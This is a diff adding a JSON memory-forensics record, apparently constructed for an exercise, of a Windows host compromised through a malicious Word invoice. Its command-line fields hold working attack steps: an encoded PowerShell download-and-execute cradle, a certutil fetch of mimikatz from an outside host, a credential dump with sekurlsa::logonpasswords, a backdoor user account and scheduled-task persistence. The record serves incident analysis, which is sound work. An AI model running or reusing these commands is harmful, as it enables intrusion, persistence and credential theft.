@@ -1,0 +1,303 @@
+{
+  "processes:": {
+    "process1": {
+      "PID": "4",
+      "PPID": "0",
+      "ImageFileName(process name)": "System",
+      "CreateTime": "2021-02-03 21:51:29",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntoskrnl.exe",
+        "DLL1.path": "C:\\Windows\\System32\\ntoskrnl.exe",
+        "DLL1.loadTime:": "2021-02-03 21:51:29"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "",
+        "Event1.ForeignAddr": "",
+        "Event1.Proto(tcpor udp)": "",
+        "Event1.localport": "",
+        "Event1.foreignport": "",
+        "Event1.owner(initiatingprocess basically)": ""
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-18",
+        "Name": "NT AUTHORITY\\SYSTEM"
+      },
+      "Execution": "Yes"
+    },
+    "process2": {
+      "PID": "776",
+      "PPID": "644",
+      "ImageFileName(process name)": "services.exe",
+      "CreateTime": "2021-02-03 21:51:35",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "C:\\Windows\\system32\\services.exe",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 21:51:35",
+        "DLL2.name": "kernel32.dll",
+        "DLL2.path": "C:\\Windows\\System32\\kernel32.dll",
+        "DLL2.loadTime:": "2021-02-03 21:51:35"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "",
+        "Event1.ForeignAddr": "",
+        "Event1.Proto(tcpor udp)": "",
+        "Event1.localport": "",
+        "Event1.foreignport": "",
+        "Event1.owner(initiatingprocess basically)": ""
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-18",
+        "Name": "NT AUTHORITY\\SYSTEM"
+      },
+      "Execution": "Yes"
+    },
+    "process3": {
+      "PID": "3120",
+      "PPID": "2860",
+      "ImageFileName(process name)": "WINWORD.EXE",
+      "CreateTime": "2021-02-03 22:13:41",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\invoice_Q1_2021.doc\"",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:13:41",
+        "DLL2.name": "kernel32.dll",
+        "DLL2.path": "C:\\Windows\\System32\\kernel32.dll",
+        "DLL2.loadTime:": "2021-02-03 22:13:41"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "",
+        "Event1.ForeignAddr": "",
+        "Event1.Proto(tcpor udp)": "",
+        "Event1.localport": "",
+        "Event1.foreignport": "",
+        "Event1.owner(initiatingprocess basically)": ""
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-21-3456789012-1234567890-987654321-1001",
+        "Name": "WORKSTATION\\john.doe"
+      },
+      "Execution": "Yes"
+    },
+    "process4": {
+      "PID": "3412",
+      "PPID": "3120",
+      "ImageFileName(process name)": "powershell.exe",
+      "CreateTime": "2021-02-03 22:14:05",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANQAuADEAMAAvAHMAdABhAGcAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+        "Command2:": "cmd.exe /c powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.55.10/stage/payload.ps1')\"",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:14:05",
+        "DLL2.name": "amsi.dll",
+        "DLL2.path": "C:\\Windows\\System32\\amsi.dll",
+        "DLL2.loadTime:": "2021-02-03 22:14:05"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "192.168.1.105:49823",
+        "Event1.ForeignAddr": "192.168.55.10:80",
+        "Event1.Proto(tcpor udp)": "TCP",
+        "Event1.localport": "49823",
+        "Event1.foreignport": "80",
+        "Event1.owner(initiatingprocess basically)": "powershell.exe"
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-21-3456789012-1234567890-987654321-1001",
+        "Name": "WORKSTATION\\john.doe"
+      },
+      "Execution": "Yes"
+    },
+    "process5": {
+      "PID": "3688",
+      "PPID": "3412",
+      "ImageFileName(process name)": "a3f8c21d.exe",
+      "CreateTime": "2021-02-03 22:14:38",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "C:\\Users\\john.doe\\AppData\\Roaming\\a3f8c21d.exe --connect 185.220.101.45:443 --persist",
+        "Command2:": "schtasks /create /tn \"WindowsUpdateHelper\" /tr \"C:\\Users\\john.doe\\AppData\\Roaming\\a3f8c21d.exe\" /sc onlogon /ru SYSTEM",
+        "Command3:": "net user backdoor P@ssw0rd123 /add"
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:14:38",
+        "DLL2.name": "ws2_32.dll",
+        "DLL2.path": "C:\\Windows\\System32\\ws2_32.dll",
+        "DLL2.loadTime:": "2021-02-03 22:14:38",
+        "DLL3.name": "cryptbase.dll",
+        "DLL3.path": "C:\\Users\\john.doe\\AppData\\Roaming\\cryptbase.dll",
+        "DLL3.loadTime:": "2021-02-03 22:14:39"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "192.168.1.105:50001",
+        "Event1.ForeignAddr": "185.220.101.45:443",
+        "Event1.Proto(tcpor udp)": "TCP",
+        "Event1.localport": "50001",
+        "Event1.foreignport": "443",
+        "Event1.owner(initiatingprocess basically)": "a3f8c21d.exe",
+        "Event2.LocalAddr": "192.168.1.105:50045",
+        "Event2.ForeignAddr": "185.220.101.45:443",
+        "Event2.Proto(tcpor udp)": "TCP",
+        "Event2.localport": "50045",
+        "Event2.foreignport": "443",
+        "Event2.owner(initiatingprocess basically)": "a3f8c21d.exe"
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-21-3456789012-1234567890-987654321-1001",
+        "Name": "WORKSTATION\\john.doe",
+        "SID2": "S-1-5-18",
+        "Name2": "NT AUTHORITY\\SYSTEM"
+      },
+      "Execution": "Yes"
+    },
+    "process6": {
+      "PID": "3744",
+      "PPID": "3688",
+      "ImageFileName(process name)": "certutil.exe",
+      "CreateTime": "2021-02-03 22:15:10",
+      "ExitTime": "2021-02-03 22:15:22",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "certutil -urlcache -split -f http://185.220.101.45/tools/mimikatz.exe C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:15:10"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "192.168.1.105:50102",
+        "Event1.ForeignAddr": "185.220.101.45:80",
+        "Event1.Proto(tcpor udp)": "TCP",
+        "Event1.localport": "50102",
+        "Event1.foreignport": "80",
+        "Event1.owner(initiatingprocess basically)": "certutil.exe"
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-21-3456789012-1234567890-987654321-1001",
+        "Name": "WORKSTATION\\john.doe"
+      },
+      "Execution": "Yes"
+    },
+    "process7": {
+      "PID": "3900",
+      "PPID": "3688",
+      "ImageFileName(process name)": "svcupd.exe",
+      "CreateTime": "2021-02-03 22:15:25",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe sekurlsa::logonpasswords full",
+        "Command2:": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svcupd.exe privilege::debug",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:15:25",
+        "DLL2.name": "mimilib.dll",
+        "DLL2.path": "C:\\Users\\john.doe\\AppData\\Local\\Temp\\mimilib.dll",
+        "DLL2.loadTime:": "2021-02-03 22:15:25"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "",
+        "Event1.ForeignAddr": "",
+        "Event1.Proto(tcpor udp)": "",
+        "Event1.localport": "",
+        "Event1.foreignport": "",
+        "Event1.owner(initiatingprocess basically)": ""
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-18",
+        "Name": "NT AUTHORITY\\SYSTEM"
+      },
+      "Execution": "Yes"
+    },
+    "process8": {
+      "PID": "1056",
+      "PPID": "776",
+      "ImageFileName(process name)": "svchost.exe",
+      "CreateTime": "2021-02-03 21:51:37",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 21:51:37"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "",
+        "Event1.ForeignAddr": "",
+        "Event1.Proto(tcpor udp)": "",
+        "Event1.localport": "",
+        "Event1.foreignport": "",
+        "Event1.owner(initiatingprocess basically)": ""
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-18",
+        "Name": "NT AUTHORITY\\SYSTEM"
+      },
+      "Execution": "Yes"
+    },
+    "process9": {
+      "PID": "3980",
+      "PPID": "3688",
+      "ImageFileName(process name)": "rundll32.exe",
+      "CreateTime": "2021-02-03 22:16:01",
+      "ExitTime": "",
+      "AssociatedCommands(commandline, found in pstree, also other commands are found in windows.cmdline in the \"Args\" column\")": {
+        "Command1:": "rundll32.exe C:\\ProgramData\\update\\srpd32.dll,DllRegisterServer",
+        "Command2:": "",
+        "Command3:": ""
+      },
+      "DllsLoaded": {
+        "DLL1.name": "ntdll.dll",
+        "DLL1.path": "C:\\Windows\\System32\\ntdll.dll",
+        "DLL1.loadTime:": "2021-02-03 22:16:01",
+        "DLL2.name": "srpd32.dll",
+        "DLL2.path": "C:\\ProgramData\\update\\srpd32.dll",
+        "DLL2.loadTime:": "2021-02-03 22:16:01"
+      },
+      "NetworkEvents:": {
+        "Event1.LocalAddr": "192.168.1.105:50200",
+        "Event1.ForeignAddr": "185.220.101.45:8080",
+        "Event1.Proto(tcpor udp)": "TCP",
+        "Event1.localport": "50200",
+        "Event1.foreignport": "8080",
+        "Event1.owner(initiatingprocess basically)": "rundll32.exe"
+      },
+      "AssociatedSIDs(using windows.getsids)": {
+        "SID1": "S-1-5-21-3456789012-1234567890-987654321-1001",
+        "Name": "WORKSTATION\\john.doe"
+      },
+      "Execution": "Yes"
+    }
+  }
+}
